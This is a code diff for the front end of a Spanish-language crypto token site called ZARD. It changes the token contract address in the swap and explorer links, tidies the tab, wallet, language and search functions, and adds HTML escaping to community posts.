@@ -243,10 +243,10 @@
                             <span>$0.04825 USD</span>
                             <span class="text-xs font-mono px-2 py-1 rounded bg-emerald-500/20 text-emerald-400 border border-emerald-500/40">+18.4%</span>
                         </div>
-                        <p class="text-xs text-gray-400 mt-1 font-mono">Contrato: <span class="text-cyber-neonblue">0x973ba2c1dccd0820f1e026d6b1f01c55c4085d38</span></p>
+                        <p class="text-xs text-gray-400 mt-1 font-mono">Contrato: <span class="text-cyber-neonblue">0x472d59538effe1c85382e3e62e1b2ec995d382ef</span></p>
                     </div>
 
-                    <a href="https://pancakeswap.finance/swap?outputCurrency=0x973ba2c1dccd0820f1e026d6b1f01c55c4085d38" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 font-orbitron font-bold text-sm px-6 py-4 rounded-xl bg-gradient-to-r from-pink-600 to-purple-600 text-white shadow-[0_0_20px_rgba(219,39,119,0.5)] hover:shadow-[0_0_30px_rgba(219,39,119,0.8)] transition-all transform hover:-scale-105">
+                    <a href="https://pancakeswap.finance/swap?outputCurrency=0x472d59538effe1c85382e3e62e1b2ec995d382ef" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 font-orbitron font-bold text-sm px-6 py-4 rounded-xl bg-gradient-to-r from-pink-600 to-purple-600 text-white shadow-[0_0_20px_rgba(219,39,119,0.5)] hover:shadow-[0_0_30px_rgba(219,39,119,0.8)] transition-all transform hover:-scale-105">
                         <i class="fa-solid fa-rotate text-lg"></i>
                         <span id="btn-pancake">SWAP DIRECTO EN PANCAKESWAP</span>
                     </a>
@@ -309,7 +309,7 @@
                         </div>
 
                         <div class="mt-6">
-                            <a href="https://pancakeswap.finance/swap?outputCurrency=0x973ba2c1dccd0820f1e026d6b1f01c55c4085d38" target="_blank" class="w-full py-3 rounded-xl bg-cyber-purple/20 border border-cyber-purple/50 text-cyber-neonblue font-orbitron font-bold text-xs flex items-center justify-center gap-2 hover:bg-cyber-purple/40 hover:text-white transition-all">
+                            <a href="https://pancakeswap.finance/swap?outputCurrency=0x472d59538effe1c85382e3e62e1b2ec995d382ef" target="_blank" class="w-full py-3 rounded-xl bg-cyber-purple/20 border border-cyber-purple/50 text-cyber-neonblue font-orbitron font-bold text-xs flex items-center justify-center gap-2 hover:bg-cyber-purple/40 hover:text-white transition-all">
                                 Operar en PancakeSwap <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i>
                             </a>
                         </div>
@@ -327,18 +327,18 @@
                     
                     <div class="flex items-center bg-cyber-deepblue border-2 border-cyber-purple/50 rounded-2xl p-2 shadow-neon-box focus-within:border-cyber-neonblue transition-all">
                         <i class="fa-solid fa-magnifying-glass text-cyber-neonblue px-4 text-lg"></i>
-                        <input type="text" id="web3-search-input" placeholder="Busca contratos (ej. 0x973b...), dApps o tokens..." class="w-full bg-transparent text-white font-mono text-sm outline-none px-2">
+                        <input type="text" id="web3-search-input" placeholder="Busca contratos (ej. 0x472d...), dApps o tokens..." class="w-full bg-transparent text-white font-mono text-sm outline-none px-2">
                         <button onclick="performWeb3Search()" class="px-6 py-3 rounded-xl bg-gradient-to-r from-cyber-purple to-cyber-neonblue font-orbitron text-xs font-bold text-white shadow-neon-purple">
                             Buscar
                         </button>
                     </div>
 
                     <div id="search-results-container" class="mt-8 text-left space-y-4">
-                        <div class="p-4 rounded-xl bg-cyber-deepblue/60 border border-cyber-purple/30 hover:border-cyber-neonblue transition-all cursor-pointer" onclick="window.open('https://bscscan.com/token/0x973ba2c1dccd0820f1e026d6b1f01c55c4085d38', '_blank')">
+                        <div class="p-4 rounded-xl bg-cyber-deepblue/60 border border-cyber-purple/30 hover:border-cyber-neonblue transition-all cursor-pointer" onclick="window.open('https://bscscan.com/token/0x472d59538effe1c85382e3e62e1b2ec995d382ef', '_blank')">
                             <h4 class="font-orbitron font-bold text-white text-sm flex items-center gap-2">
                                 <i class="fa-solid fa-shield-halved text-emerald-400"></i> ZARD Official Smart Contract (BscScan)
                             </h4>
-                            <p class="text-xs text-gray-400 mt-1 font-mono">0x973ba2c1dccd0820f1e026d6b1f01c55c4085d38 - Token BEP-20 oficial.</p>
+                            <p class="text-xs text-gray-400 mt-1 font-mono">0x472d59538effe1c85382e3e62e1b2ec995d382ef - Token BEP-20 oficial.</p>
                         </div>
                     </div>
                 </div>
@@ -417,20 +417,20 @@
             setTimeout(() => {
                 welcomeScreen.style.display = 'none';
                 mainApp.classList.remove('opacity-0', 'pointer-events-none');
-                mainApp.classList.add('opacity-100');
             }, 800);
         }
 
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-            document.querySelectorAll('.tab-btn').forEach(el => {
-                el.classList.remove('text-cyber-neonblue', 'bg-cyber-purple/20', 'border', 'border-cyber-purple/40');
-                el.classList.add('text-gray-400');
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.className = "tab-btn flex items-center gap-2 px-4 py-2 rounded-lg font-orbitron text-xs sm:text-sm font-bold text-gray-400 hover:text-white hover:bg-cyber-purple/10 transition-all";
             });
-            document.getElementById(`tab-${tabId}`).classList.remove('hidden');
-            const activeBtn = document.getElementById(`tab-btn-${tabId}`);
-            activeBtn.classList.remove('text-gray-400');
-            activeBtn.classList.add('text-cyber-neonblue', 'bg-cyber-purple/20', 'border', 'border-cyber-purple/40');
+
+            document.getElementById('tab-' + tabId).classList.remove('hidden');
+            const activeBtn = document.getElementById('tab-btn-' + tabId);
+            if (activeBtn) {
+                activeBtn.className = "tab-btn flex items-center gap-2 px-4 py-2 rounded-lg font-orbitron text-xs sm:text-sm font-bold text-cyber-neonblue bg-cyber-purple/20 border border-cyber-purple/40 transition-all";
+            }
         }
 
         function openWalletModal() {
@@ -448,8 +448,23 @@
         function selectWallet(walletName) {
             selectedWalletName = walletName;
             closeWalletModal();
-            document.getElementById('connect-text').innerText = `${walletName}: 0x973b...d38`;
-            alert(`¡Conectado con ${walletName}!`);
+            const connectBtnText = document.getElementById('connect-text');
+            connectBtnText.innerText = walletName.split(' ')[0] + ' (Conectado)';
+            
+            alert('¡Conectado exitosamente con ' + walletName + '! Red BNB Smart Chain activa.');
+        }
+
+        function shareWallet() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'ZARD Innovation Nexus',
+                    text: '¡Explora el ecosistema Web3 de ZARD Innovation y su Cyber Wallet!',
+                    url: window.location.href,
+                }).catch(() => {});
+            } else {
+                navigator.clipboard.writeText(window.location.href);
+                alert('¡Enlace copiado al portapapeles!');
+            }
         }
 
         function changeLanguage(lang) {
@@ -458,7 +473,7 @@
             document.getElementById('welcome-title').innerText = t.welcomeTitle;
             document.getElementById('welcome-subtitle').innerText = t.welcomeSubtitle;
             document.getElementById('btn-enter').innerHTML = `<i class="fa-solid fa-bolt-lightning text-cyber-neonblue"></i> ${t.btnEnter}`;
-            document.getElementById('connect-text').innerText = selectedWalletName ? `${selectedWalletName}: 0x973b...d38` : t.connectText;
+            document.getElementById('connect-text').innerText = t.connectText;
             document.getElementById('nav-trade').innerText = t.navTrade;
             document.getElementById('nav-search').innerText = t.navSearch;
             document.getElementById('nav-square').innerText = t.navSquare;
@@ -466,22 +481,12 @@
             document.getElementById('lbl-zard-pool').innerText = t.lblZardPool;
             document.getElementById('orderbook-title').innerHTML = `<i class="fa-solid fa-list-check text-cyber-neonblue"></i> ${t.orderbookTitle}`;
             document.getElementById('lbl-add-img').innerText = t.lblAddImg;
-            document.body.dir = (lang === 'ar') ? 'rtl' : 'ltr';
-        }
 
-        function shareWallet() {
-            if (navigator.share) {
-                navigator.share({ title: 'ZARD Wallet', url: window.location.href }).catch(() => {});
+            if (lang === 'ar') {
+                document.documentElement.dir = 'rtl';
             } else {
-                navigator.clipboard.writeText(window.location.href);
-                alert('¡Enlace copiado!');
+                document.documentElement.dir = 'ltr';
             }
-        }
-
-        function performWeb3Search() {
-            const query = document.getElementById('web3-search-input').value.trim();
-            if(!query) { alert('Ingresa un término.'); return; }
-            alert(`Buscando "${query}" en la BNB Smart Chain...`);
         }
 
         function previewPostImage(event) {
@@ -492,42 +497,57 @@
                     attachedImageBase64 = e.target.result;
                     document.getElementById('image-preview').src = attachedImageBase64;
                     document.getElementById('image-preview-container').classList.remove('hidden');
-                }
+                };
                 reader.readAsDataURL(file);
             }
         }
 
         function removeImage() {
             attachedImageBase64 = null;
+            document.getElementById('image-preview').src = '';
             document.getElementById('image-preview-container').classList.add('hidden');
             document.getElementById('post-image-input').value = '';
         }
 
         function createPost() {
             const content = document.getElementById('post-content').value.trim();
-            if(!content && !attachedImageBase64) { alert('Escribe algo o añade una imagen.'); return; }
+            if (!content && !attachedImageBase64) {
+                alert('Escribe algo o añade una imagen para publicar.');
+                return;
+            }
 
             const feed = document.getElementById('posts-feed');
             const postHTML = `
-                <div class="rounded-2xl bg-cyber-deepblue/70 border border-cyber-purple/30 p-5 shadow-lg">
+                <div class="rounded-2xl bg-cyber-deepblue/70 border border-cyber-purple/30 p-5 shadow-lg animate-fade-in">
                     <div class="flex items-center justify-between mb-3">
                         <div class="flex items-center gap-3">
                             <img src="https://photos.pinksale.finance/file/pinksale-logo-upload/1789411086014-7b67968ed9538e215f1948583ee37c7c.png" alt="ZARD" class="w-10 h-10 object-contain rounded-full bg-cyber-darkbg border border-cyber-purple/50 p-1">
                             <div>
-                                <span class="font-orbitron font-bold text-white text-sm block">ZARD Holder</span>
+                                <span class="font-orbitron font-bold text-white text-sm block">${selectedWalletName ? selectedWalletName + ' User' : 'ZARD Community'}</span>
                                 <span class="text-xs text-gray-400 font-mono">Justo ahora • BNB Chain</span>
                             </div>
                         </div>
-                        <span class="text-xs font-mono px-2 py-1 rounded bg-cyber-neonblue/20 text-cyber-neonblue border border-cyber-neonblue/40">Community</span>
+                        <span class="text-xs font-mono px-2 py-1 rounded bg-cyber-neonblue/20 text-cyber-neonblue border border-cyber-neonblue/40">Comunidad</span>
                     </div>
-                    <p class="text-sm text-gray-200 font-mono mb-3">${content}</p>
-                    ${attachedImageBase64 ? `<div class="mb-3"><img src="${attachedImageBase64}" class="rounded-lg max-h-64 w-full object-cover border border-cyber-purple/30"></div>` : ''}
+                    <p class="text-sm text-gray-200 font-mono mb-3">${escapeHtml(content)}</p>
+                    ${attachedImageBase64 ? `<div class="mb-3"><img src="${attachedImageBase64}" class="rounded-xl max-h-64 object-cover border border-cyber-purple/40"></div>` : ''}
                 </div>
             `;
+
             feed.insertAdjacentHTML('afterbegin', postHTML);
             document.getElementById('post-content').value = '';
             removeImage();
-            alert('¡Publicado en ZARD Square!');
+        }
+
+        function escapeHtml(text) {
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
+            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+        }
+
+        function performWeb3Search() {
+            const query = document.getElementById('web3-search-input').value.trim();
+            if (!query) return;
+            alert('Buscando en la red descentralizada ZARD: ' + query);
         }
     </script>
 </body>
